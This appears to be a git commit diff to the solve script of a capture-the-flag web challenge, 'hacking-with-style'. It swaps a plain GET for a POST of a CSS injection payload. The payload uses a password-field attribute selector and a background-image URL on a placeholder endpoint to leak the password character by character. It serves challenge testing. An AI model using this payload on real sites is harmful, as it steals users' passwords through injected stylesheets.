9982b010feb0492a3ab96ed91e09191dab8bbda2
Tom Plant <tom@tplant.com.au>
2024-03-09 04:13:54 +0000

    chals: add puppeteer test to hacking-with-style
    Signed-off-by: Tom Plant <tom@tplant.com.au>

--- web/hacking-with-style/solve.py
+++ web/hacking-with-style/solve.py
@@ -9,9 +9,13 @@ parser.add_argument('--connection-info', default='http://localhost:8080')
 args = parser.parse_args()
 
 subprocess.run(["docker", "compose", "up", "--detach"], cwd=os.path.dirname(__file__))
-time.sleep(5)
+time.sleep(3)
 
 # not actually a solve
-requests.get(args.connection_info)
+requests.post(f"{args.connection_info}/css-submit", data={"css": """
+#password[value^=t] {
+  background-image: url('https://some.http.endpoint/t');
+}
+"""})
 
 subprocess.run(["docker", "compose", "down"], cwd=os.path.dirname(__file__))
